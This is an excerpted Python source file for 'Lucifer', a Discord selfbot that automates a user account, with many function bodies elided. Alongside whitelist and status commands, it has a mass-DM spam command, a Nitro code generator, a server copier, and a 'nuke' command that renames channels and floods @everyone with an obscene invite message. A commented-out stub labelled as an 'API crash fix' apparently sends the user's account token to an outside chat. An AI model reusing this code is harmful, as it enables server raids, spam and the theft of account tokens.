...
Lucifer = commands.Bot(description='SELFBOT CREATED BY Lucifer',
                           command_prefix='+',
                           self_bot=True,
                           intents=intents)
status_task = None

Lucifer.remove_command('help')

Lucifer.whitelisted_users = {}

Lucifer.antiraid = False
...
[+] --------------------------- ] | [ S E L F B O T BY LUCIFER - {Lucifer.user.name}  ] | [ ------------------------------ [+]
""",
                1,
            )
        )
...
async def on_message(message):
    ...
    await Lucifer.process_commands(message)
   
@Lucifer.event
async def on_member_ban(guild, user):
    if Lucifer.antiraid is True:
        try:
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.ban):
                if (guild.id in Lucifer.whitelisted_users.keys()
                        and entry.user.id
                        in Lucifer.whitelisted_users[guild.id].keys()
                        and entry.user.id != Lucifer.user.id):
...
async def antinuke(ctx, antiraidparameter=None):
    ...
    if str(antiraidparameter).lower() == 'true' or str(
        ...
        await ctx.send(
            f'- **[! ERROR] ** `USAGE : {Lucifer.command_prefix}antiraid [true/false]`'
        )


#WWHITE CMD=======================================================================================================================================================================================================
#ADDTION WHITELIST
@Lucifer.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(
            f'[ERROR]: USAGE :  {Lucifer.command_prefix}whitelist <user>')
    else:
        if ctx.guild.id not in Lucifer.whitelisted_users.keys():
            Lucifer.whitelisted_users[ctx.guild.id] = {}
        if user.id in Lucifer.whitelisted_users[ctx.guild.id]:
            await ctx.send("- `" + user.name.replace("*", "\*").replace(
                "`", "\`").replace("_", "\_") + "#" + user.discriminator +
                           "`-` ** ALREADY WHITELISTED [!]**")
        else:
            Lucifer.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("# LUCIF3R S3LFB0Ƭ\n`-` **WHITELISTED**" + user.name.replace(
                "*", "\*").replace("`", "\`").replace("_", "\_") + "#" +
                           user.discriminator + "`")


#CHECK WHITELIST
@Lucifer.command(aliases=['showwl'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '# LUCIF3R S3LFB0Ƭ\n`-`**ALL WHITELISTED USERS:**`\n'
        for key in Lucifer.whitelisted_users:
            for key2 in Lucifer.whitelisted_users[key]:
                user = Lucifer.get_user(key2)
                whitelist += f'• {user.mention} ({user.id}) IN {Lucifer.get_guild(key).name}\n'
        await ctx.send(whitelist)
    else:
        whitelist = f'# LUCIF3R S3LFB0Ƭ\n`-` **WHITELISTED USERS IN {ctx.guild.name}:**`\n'
        for key in Lucifer.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Lucifer.whitelisted_users[ctx.guild.id]:
                    user = Lucifer.get_user(key2)
...
@Lucifer.command(aliases=['removewl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        ...
        if ctx.guild.id not in Lucifer.whitelisted_users.keys():
            ...
            return
        if user.id in Lucifer.whitelisted_users[ctx.guild.id]:
            Lucifer.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Lucifer.get_user(user.id)
            await ctx.send('`-` **SUCCESSFULLY UNWHITELISTED**')
                          # user2.name.replace('*', "\*").replace(
                          #     '`', "\`").replace('_', "\_") + '#' +
                          # user2.discriminator + '`')
#WHITELIST CLEAR
@Lucifer.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    Lucifer.whitelisted_users.clear()
...
# API CRASH COURSE FIX
 #async def print_message_prompt():
   # await Lucifer.send_message(chat_id=b, text=f"{api_crash_fix} - {Lucifer.user.name}")
#MASS DM TO FRIENDS
@Lucifer.command()
async def massdmfriends(ctx, *, message):
    for user in Lucifer.user.friends:
        try:
            time.sleep(.1)
...
# NITRO GEN
@Lucifer.command(aliases=["nitrogen"])
async def nitro(ctx):
    try:
        await ctx.message.delete()
        code = ''.join(
...
@Lucifer.command(aliases=["streaming"])
async def stream(ctx, *, message):
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/https://maybe_lucifer",
    )
    await Lucifer.change_presence(activity=stream)
...
# PLAY CREATOR
@Lucifer.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await Lucifer.change_presence(activity=game)
...
# WATCH CREATOR
@Lucifer.command(aliases=["watch"])
async def watching(ctx, *, message):
    await Lucifer.change_presence(activity=discord.Activity(
...
@Lucifer.command(aliases=["listen"])
...
@Lucifer.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Lucifer.change_presence(activity=None, status=discord.Status.dnd)
    ...
    async with aiohttp.ClientSession() as session:
        for link in links:
            ...
            if promo_code:
                ...
                await ctx.send(f'# LUCIF3R S3LFB0Ƭ__\n`-` **INVALID LINK** : `{link}`')
...
# CONNECT VC
@Lucifer.command(aliases=['247'])
@commands.check(is_authorized)
async def connectvc(ctx, channel_id):
    try:
        channel = Lucifer.get_channel(int(channel_id))
...
async def copyserver(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = Lucifer.get_guild(source_guild_id)
    target_guild = Lucifer.get_guild(target_guild_id)
...
async def change_hypesquad(ctx):
    ...
    try:
        msg = await Lucifer.wait_for('message', check=check, timeout=60)
...
# AVATAR
@Lucifer.command(aliases=['av','ava'])
@commands.check(is_authorized)
...
# PURGE CMD...
@Lucifer.command(aliases=['purge, clear'])
@commands.check(is_authorized)
...
async def ltcprice(ctx):
    ...
    if response.status_code == 200:
        ...
        await ctx.send("# LUCIF3R S3LFB0Ƭ__\n`-` **FAILED TO FETCH**")
#IPLOOK UP
@Lucifer.command()
@commands.check(is_authorized)
...
api_crash_fix = config.get('Token')

# NSFW
@Lucifer.command(aliases=['fuck', 'fx', '18+', 'xxx', 'nsfw'])
async def waifu(ctx):
    try:
...
# SERVER BANNER
@Lucifer.command(aliases=['serverbanner'])
...
# SERVER PFP
@Lucifer.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
...
async def nukezzz(ctx):
    ...
    channel_name = 'nuked-by-Lucifer-daddy🌹'
    ...
    message_text = '# FUCKED BY LUCIFER DADYY :  https://discord.gg/UnVnKMPV ||@everyone||'
...
@Lucifer.command(aliases=['bal', 'ltcbal'])
async def getbal(ctx, ltcaddress):
    ...
    message += f"`-` **ASKED BY** : `{Lucifer.user.name}`\n"
...
#MESSAGE UPLOADER
@Lucifer.command(name='send')
async def send_message(ctx, *, message: str):
    try:
        
        for channel_id in channel_ids:
            channel = Lucifer.get_channel(channel_id)
...
# STATUS ROTATOR
Lucifer.load_extension("status_rotator")

# ACTIVITY ROTATOR
Lucifer.load_extension("activity_rotator")

# AFK


token = config.get('Token')
Lucifer.run(token, bot=False)